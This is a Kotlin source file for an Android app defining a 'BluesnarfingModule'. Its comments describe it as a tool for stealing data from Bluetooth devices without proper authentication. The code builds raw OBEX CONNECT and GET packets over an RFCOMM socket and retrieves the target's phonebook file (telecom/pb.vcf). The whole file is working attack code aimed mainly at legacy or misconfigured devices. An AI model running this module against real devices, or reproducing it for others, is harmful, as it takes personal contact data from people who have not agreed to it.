package com.hereliesaz.blusnu.data

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream
import java.util.UUID

/**
 * Module responsible for Bluesnarfing attacks.
 *
 * Bluesnarfing exploits vulnerabilities in the Object Exchange (OBEX) protocol
 * to steal information from a Bluetooth device without proper authentication.
 *
 * This implementation targets the Object Push Profile (OPP) or File Transfer Profile (FTP)
 * to attempt retrieving the phonebook (PBAP) or other files.
 *
 * Note: Modern Android devices implement strict security on OBEX, usually requiring pairing
 * and user confirmation. This module is effective primarily against legacy devices (pre-2010)
 * or misconfigured IoT/Embedded systems.
 */
class BluesnarfingModule {

    private companion object {
        const val TAG = "BluesnarfingModule"

        // OBEX Protocol Constants
        // 0x80 = Connect, 0x83 = Get (Final Bit Set)
        const val OBEX_CONNECT_OPCODE: Byte = 0x80.toByte()
        const val OBEX_GET_OPCODE: Byte = 0x83.toByte()

        // OBEX Response Codes
        // 0xA0 = Success (OK)
        const val OBEX_SUCCESS_RESPONSE: Byte = 0xA0.toByte()

        // OBEX Header Identifiers
        // 0x48 = Body (End of Body)
        const val OBEX_BODY_HEADER: Byte = 0x48.toByte()
    }

    // Standard UUID for the OBEX Object Push Profile.
    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")

    /**
     * Attempts to retrieve the phonebook (telecom/pb.vcf) from the target device.
     *
     * @param device The BluetoothDevice to attack.
     * @return Result containing the phonebook data (String) or an Exception.
     */
    fun getPhonebook(device: BluetoothDevice): Result<String> {
        var socket: BluetoothSocket? = null
        return try {
            socket = device.createRfcommSocketToServiceRecord(OBEX_OPP_UUID)
            socket.connect()

            val outputStream = socket.outputStream
            val inputStream = socket.inputStream

            // --- Step 1: Establish OBEX Connection ---
            val connectRequest = byteArrayOf(
                OBEX_CONNECT_OPCODE, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
            )
            outputStream.write(connectRequest)

            val connectResponse = readObexResponse(inputStream)

            if (connectResponse[0] != OBEX_SUCCESS_RESPONSE) {
                return Result.failure(IOException("OBEX CONNECT failed"))
            }

            // --- Step 2: Request the Phonebook File ---
            val fileName = "telecom/pb.vcf".toByteArray(Charsets.UTF_16BE)

            // OBEX Name header: HI (0x01) + 2-byte length (includes HI + length bytes + value)
            val nameHeaderLength = 3 + fileName.size
            val nameHeader = byteArrayOf(
                0x01,
                (nameHeaderLength shr 8).toByte(),
                (nameHeaderLength and 0xFF).toByte()
            ) + fileName

            // Connection ID header (0xCB) — 5 bytes total: HI + 4-byte value
            val connectionIdHeader = byteArrayOf(0xcb.toByte(), 0x00, 0x00, 0x00, 0x01)

            val payload = nameHeader + connectionIdHeader
            // Total packet: opcode (1) + packet length (2) + payload
            val packetLength = 3 + payload.size
            val getRequest = byteArrayOf(
                OBEX_GET_OPCODE,
                (packetLength shr 8).toByte(),
                (packetLength and 0xFF).toByte()
            ) + payload

            outputStream.write(getRequest)

            // --- Step 3: Read the Data ---
            val getResponse = readObexResponse(inputStream)

            if (getResponse[0] == OBEX_SUCCESS_RESPONSE) {
                val bodyHeaderIndex = getResponse.indexOf(OBEX_BODY_HEADER)

                if (bodyHeaderIndex != -1 && bodyHeaderIndex + 2 < getResponse.size) {
                    val bodyLength = ((getResponse[bodyHeaderIndex + 1].toInt() and 0xFF) shl 8) or
                        (getResponse[bodyHeaderIndex + 2].toInt() and 0xFF)

                    val bodyStartIndex = bodyHeaderIndex + 3
                    // bodyLength includes the 3-byte header (HI + 2-byte length)
                    val dataLength = bodyLength - 3
                    if (dataLength > 0 && bodyStartIndex + dataLength <= getResponse.size) {
                        Result.success(String(getResponse, bodyStartIndex, dataLength))
                    } else {
                        Result.failure(IOException("Invalid body length in OBEX response"))
                    }
                } else {
                    Result.failure(IOException("Phonebook data not found in response"))
                }
            } else {
                Result.failure(IOException("OBEX GET failed"))
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error during bluesnarfing", e)
            Result.failure(e)
        } finally {
            try {
                socket?.close()
            } catch (e: IOException) {
                Log.e(TAG, "Error closing socket", e)
            }
        }
    }

    /**
     * Reads a complete OBEX response frame from the stream.
     * Handles sign extension and ensures full reads.
     */
    private fun readObexResponse(inputStream: InputStream): ByteArray {
        val response = ByteArrayOutputStream()

        val header = ByteArray(3)
        readFully(inputStream, header)
        response.write(header)

        val length = ((header[1].toInt() and 0xFF) shl 8) or (header[2].toInt() and 0xFF)

        if (length > 3) {
            val payload = ByteArray(length - 3)
            readFully(inputStream, payload)
            response.write(payload)
        }

        return response.toByteArray()
    }

    /**
     * Reads exactly [buffer.size] bytes from the stream, looping until the buffer is full.
     */
    private fun readFully(inputStream: InputStream, buffer: ByteArray) {
        var offset = 0
        while (offset < buffer.size) {
            val bytesRead = inputStream.read(buffer, offset, buffer.size - offset)
            if (bytesRead == -1) {
                throw IOException("Unexpected end of OBEX stream after $offset/${buffer.size} bytes")
            }
            offset += bytesRead
        }
    }
}
